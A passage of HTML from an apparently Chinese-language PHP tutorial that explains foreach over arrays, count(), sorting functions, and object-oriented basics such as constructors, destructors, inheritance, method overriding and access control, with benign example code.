class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>通过上面的运行结果我们得出下面的结果：</strong></font><br>1.每次循环的时候，把下标赋值给了变量$key，把值的变量赋值给了变量$value<br>2.循环一次读一次键和值。读到最后，发现没有可以读取的数组元素后，停止循环遍历数据。<br><strong>注意：</strong>$key 和$value并不是变量名必须得为这两个名字。你命名为其他的也可以，如 $kai =&gt; $wen是一样的。 你要清楚键赋值给了哪个变量，值赋值给了另外的哪个变量。</font></p><p><font color="#00B2EE"><strong>3. 通过foreach遍历不连续的索引数组，如下例：</strong></font><br> </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php header<span class="token punctuation">(</span><span class="token string">"Content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //设置编码 <span class="token variable">$data</span> <span class="token operator">=</span> array<span class="token punctuation">(</span>     0 <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'中国'</span>,     100 <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'美国'</span>,     20 <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'韩国'</span>,     300 <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'德国'</span>, <span class="token punctuation">)</span><span class="token punctuation">;</span>  foreach<span class="token punctuation">(</span><span class="token variable">$data</span> as <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">echo</span> <span class="token variable">$k</span> <span class="token keyword">.</span> <span class="token string">'------'</span> <span class="token keyword">.</span> <span class="token variable">$v</span> <span class="token keyword">.</span><span class="token string">'&lt;br />'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>?<span class="token operator">></span>运行结果：0------中国100------美国20------韩国300------德国<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><font face="Comic sans MS">按照foreach的结果推理与刚刚做的关联数组的结果是一样的。<br>不同的是不连续的索引数组。每读一次数组的元素，将当次循环的下标赋值给了变量$k，值赋值给了变量$v。<font color="red"><strong>（即不像for循环一样的循环遍历）</strong></font> 每读将键和值输出，然后显示出来。循环一次向后移动一次下标。读取至最后，退出执行。<br></font></p><p>&emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>4. foreach遍历遍历多维数组：</strong></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>       <span class="token number">0</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">array</span><span class="token punctuation">(</span>           <span class="token string">'中国'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'china'</span><span class="token punctuation">,</span>           <span class="token string">'美国'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'usa'</span><span class="token punctuation">,</span>           <span class="token string">'德国'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">' Germany'</span><span class="token punctuation">,</span>       <span class="token punctuation">)</span><span class="token punctuation">,</span>       <span class="token number">1</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">array</span><span class="token punctuation">(</span>           <span class="token string">'湖北'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'hubei'</span><span class="token punctuation">,</span>           <span class="token string">'河北'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'hebei'</span><span class="token punctuation">,</span>           <span class="token string">'山东'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'shandong'</span><span class="token punctuation">,</span>           <span class="token string">'山西'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'sanxi'</span><span class="token punctuation">,</span>       <span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//注：我们在使用foreach循环时，第一次循环将键为0和键为1的两个数组赋值给一个变量($value)。然后，</span><span class="token comment" spellcheck="true">//再套一个循环遍历这个$value变量，$value中的值取出来，赋值给$k和$v。</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//第一次循环把国家的数组赋值给了$value</span>   <span class="token comment" spellcheck="true">//第二次循环把中国的省份的数组又赋值给了$value</span>   <span class="token comment" spellcheck="true">//因此，我在循环的时候把$value再遍历一次</span>   <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$value</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>           <span class="token keyword">echo</span> <span class="token variable">$k</span> <span class="token punctuation">.</span> <span class="token string">'-----'</span> <span class="token punctuation">.</span> <span class="token variable">$v</span> <span class="token punctuation">.</span><span class="token string">'&lt;br />'</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token comment" spellcheck="true">//为了看的更清晰，我在中间加上华丽丽的分割线方便你来分析</span>   <span class="token keyword">echo</span> <span class="token string">'----------分割线-----------&lt;br />'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>总结：</strong></p><ol><li>第一次循环的时候，将数组赋值给了$value，然后用foreach循环$value。将二维的子数组中的键给到$k，值赋值给变量$v。</li><li>第一次循环退出子数组的循环，执行后续代码显示分割线。</li><li>依此类推，第二次循环也是这样。</li></ol></blockquote><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>5. 统计数组元素个数</strong></font><br>数组是我们最常用到的类型，那如何计算某个一维数组的个数呢。其实我们可以用到我们之前学过的数学函数里面的一个：<font color="#00B2EE"><strong>count()</strong></font>。<br><font color="#FF7F00">count($变量)</font> 函数用于返回数组的长度（元素数）：<br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$name</span><span class="token operator">=</span>Array<span class="token punctuation">(</span><span class="token string">'tom'</span>,<span class="token string">'andy'</span>,<span class="token string">'jack'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> count<span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>6. PHP 数组排序</strong></font><br>数组中的元素可以按字母或数字顺序进行降序或升序排列。<br>升序：从小到大的顺序进行排序，如果是英文单词，那么按字母A-Za-z的顺序排序，如果是数字，那么按数字的大小进行排序。<br>降序：与升序相反</font></p><p>   sort() - 对数组进行升序排列<br>   rsort() - 对数组进行降序排列<br>   asort() - 根据关联数组的值，对数组进行升序排列<br>   ksort() - 根据关联数组的键，对数组进行升序排列<br>   arsort() - 根据关联数组的值，对数组进行降序排列<br>   krsort() - 根据关联数组的键，对数组进行降序排列<br></p><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>7. 数组函数</strong></font><br><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/php_ref_array.asp" target="_blank" rel="noopener">PHP 数组函数</a>]</font></font></p><p>&emsp;<br>&emsp;</p><h4 id="1-7-PHP-命名空间"><font color="#3CB371" face="Comic sans MS">1.7 PHP 命名空间</font><a href="post/PHP-1#1-7-PHP-命名空间"></a></h4><p><font face="Comic sans MS"><font color="red"><strong>[<a href="https://directoree.github.io/post/PHP-namespace">参见本站博客：PHP-命名空间</a>]</strong></font><br></font></p><p>&emsp;<br>&emsp;</p><h4 id="1-8-PHP-面向对象"><font color="#3CB371" face="Comic sans MS">1.8 PHP 面向对象</font><a href="post/PHP-1#1-8-PHP-面向对象"></a></h4><ul><li>[ ]<font face="Comic sans MS"><font color="red"><strong>类：</strong></font>  定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。</font></li><li>[ ]<font face="Comic sans MS"><font color="red"><strong>对象：</strong></font>  是类的实例。</font></li><li>[ ]<font face="Comic sans MS"><font color="red"><strong>成员变量：</strong></font>  定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可称为对象的属性。</font></li><li>[ ]<font face="Comic sans MS"><font color="red"><strong>成员函数：</strong></font>  定义在类的内部，可用于访问对象的数据。</font></li><li>[ ]<font face="Comic sans MS"><font color="red"><strong>继承：</strong></font>  继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把这个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。</font></li><li>[ ]<font face="Comic sans MS"><font color="red"><strong>父类：</strong></font>  一个类被其他类继承，可将该类称为父类，或基类，或超类。</font></li><li>[ ]<font face="Comic sans MS"><font color="red"><strong>子类：</strong></font>  一个类继承其他类称为子类，也可称为派生类。</font></li><li>[ ]<font face="Comic sans MS"><font color="red"><strong>多态：</strong></font>  多态性是指相同的操作或函数、过程可作用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性。</font></li><li>[ ]<font face="Comic sans MS"><font color="red"><strong>重载：</strong></font>  简单说，就是函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。</font></li><li>[ ]<font face="Comic sans MS"><font color="red"><strong>抽象性：</strong></font>  抽象性是指将具有一致的数据结构（属性）和行为（操作）的对象抽象成类。一个类就是这样一种抽象，它反映了与应用有关的重要性质，而忽略其他一些无关内容。任何类的划分都是主观的，但必须与具体的应用有关。</font></li><li>[ ]<font face="Comic sans MS"><font color="red"><strong>封装：</strong></font> 封装是指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内。</font></li><li>[ ]<font face="Comic sans MS"><font color="red"><strong>构造函数：</strong></font>  主要用来在创建对象时初始化对象，即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。</font></li><li>[ ]<font face="Comic sans MS"><font color="red"><strong>析构函数：</strong></font>  析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做”清理善后” 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）。</font></li></ul><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>1. 构造函数</strong></font><br>构造函数 ，是一种特殊的方法。主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。<br> PHP 5 允行开发者在一个类中定义一个方法作为构造函数，语法格式如下：<br><font color="#00B2EE"> void  __construct ([ mixed $args [, $… ]] )</font><br> 在上面的例子中我们就可以通过构造方法来初始化 $url 和 $title 变量：<br></font></p><pre class="line-numbers language-php"><code class="language-php"> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span> <span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span> <span class="token operator">=</span> <span class="token variable">$par1</span><span class="token punctuation">;</span>   <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">title</span> <span class="token operator">=</span> <span class="token variable">$par2</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>示例代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//设置编码</span> <span class="token keyword">class</span> <span class="token class-name">Site</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">/* 成员变量 */</span>     <span class="token keyword">var</span> <span class="token variable">$url</span><span class="token punctuation">;</span>     <span class="token keyword">var</span> <span class="token variable">$title</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">/* 成员函数 */</span>     <span class="token keyword">function</span> <span class="token function">setUrl</span><span class="token punctuation">(</span><span class="token variable">$par</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span> <span class="token operator">=</span> <span class="token variable">$par</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">function</span> <span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span> <span class="token punctuation">.</span><span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">function</span> <span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token variable">$par</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">title</span> <span class="token operator">=</span> <span class="token variable">$par</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">function</span> <span class="token function">getTitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">title</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span> <span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span> <span class="token operator">=</span> <span class="token variable">$par1</span><span class="token punctuation">;</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">title</span> <span class="token operator">=</span> <span class="token variable">$par2</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// 调用成员函数，设置标题和URL</span> <span class="token variable">$php</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Site</span><span class="token punctuation">(</span><span class="token string">'www.php.cn'</span><span class="token punctuation">,</span> <span class="token string">'php中文网'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$taobao</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Site</span><span class="token punctuation">(</span><span class="token string">'www.taobao.com'</span><span class="token punctuation">,</span> <span class="token string">'淘宝'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$google</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Site</span><span class="token punctuation">(</span><span class="token string">'www.google.com'</span><span class="token punctuation">,</span> <span class="token string">'Google 搜索'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 调用成员函数，获取标题和URL</span> <span class="token variable">$php</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getTitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$taobao</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getTitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$google</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getTitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$php</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$taobao</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$google</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>2. 析构函数</strong></font><br>析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。<br></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//设置编码</span> <span class="token keyword">class</span> <span class="token class-name">MyDestructableClass</span> <span class="token punctuation">{</span>     <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">print</span> <span class="token string">"构造函数\n"</span><span class="token punctuation">;</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string">"MyDestructableClass"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">print</span> <span class="token string">"销毁 "</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyDestructableClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>示例代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//设置编码</span> <span class="token keyword">class</span> <span class="token class-name">MyDestructableClass</span> <span class="token punctuation">{</span>     <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">print</span> <span class="token string">"构造函数\n"</span><span class="token punctuation">;</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string">"MyDestructableClass"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">print</span> <span class="token string">"销毁 "</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyDestructableClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. 继承</strong></font><br>PHP 使用关键字 extends 来继承一个类，PHP 不支持多继承，格式如下：<br></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Child</span> <span class="token keyword">extends</span> <span class="token class-name">Parent</span> <span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">// 代码部分</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>示例代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// 子类扩展站点类别</span><span class="token keyword">class</span> <span class="token class-name">Child_Site</span> <span class="token keyword">extends</span> <span class="token class-name">Site</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token variable">$category</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">setCate</span><span class="token punctuation">(</span><span class="token variable">$par</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">category</span> <span class="token operator">=</span> <span class="token variable">$par</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">getCate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">category</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>4. 方法重写</strong></font><br>如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。<br>下面的例中重写了 getUrl 与 getTitle 方法：<br></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span> <span class="token punctuation">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getTitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">title</span> <span class="token punctuation">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">title</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>5. 访问控制</strong></font><br>PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的。<br><font color="#00B2EE"><strong>public（公有）：</strong></font>公有的类成员可以在任何地方被访问。<br><font color="#00B2EE"><strong>protected（受保护）：</strong></font>受保护的类成员则可以被其自身以及其子类和父类访问。<br><font color="#00B2EE"><strong>private（私有）：</strong></font>私有的类成员则只能被其定义所在的类访问。</font></p><p><font color="red"><strong>(1) 属性的访问控制</strong></font><br>类属性必须定义为公有，受保护，私有之一。如果用 var 定义，则被视为公有。<br></p><p>代码示例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token comment" spellcheck="true">/**  * Define MyClass  */</span> <span class="token keyword">class</span> <span class="token class-name">MyClass</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token variable">$public</span> <span class="token operator">=</span> <span class="token string">'Public'</span><span class="token punctuation">;</span>     <span class="token keyword">protected</span> <span class="token variable">$protected</span> <span class="token operator">=</span> <span class="token string">'Protected'</span><span class="token punctuation">;</span>     <span class="token keyword">private</span> <span class="token variable">$private</span> <span class="token operator">=</span> <span class="token string">'Private'</span><span class="token punctuation">;</span>     <span class="token keyword">function</span> <span class="token function">printHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">public</span><span class="token punctuation">;</span>         <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">protected</span><span class="token punctuation">;</span>         <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">private</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">public</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这行能被正常执行</span> <span class="token keyword">echo</span> <span class="token variable">$obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">protected</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这行会产生一个致命错误</span> <span class="token keyword">echo</span> <span class="token variable">$obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">private</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这行也会产生一个致命错误</span> <span class="token variable">$obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">printHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 Public、Protected 和 Private</span> <span class="token comment" spellcheck="true">/**  * Define MyClass2  */</span> <span class="token keyword">class</span> <span class="token class-name">MyClass2</span> <span class="token keyword">extends</span> <span class="token class-name">MyClass</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">// 可以对 public 和 protected 进行重定义，但 private 而不能</span>     <span class="token keyword">protected</span> <span class="token variable">$protected</span> <span class="token operator">=</span> <span class="token string">'Protected2'</span><span class="token punctuation">;</span>     <span class="token keyword">function</span> <span class="token function">printHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">public</span><span class="token punctuation">;</span>         <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">protected</span><span class="token punctuation">;</span>         <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">private</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token variable">$obj2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$obj2</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">public</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这行能被正常执行</span> <span class="token keyword">echo</span> <span class="token variable">$obj2</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">private</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 未定义 private</span> <span class="token keyword">echo</span> <span class="token variable">$obj2</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">protected</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这行会产生一个致命错误</span> <span class="token variable">$obj2</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">printHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 Public、Protected2 和 Undefined</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font 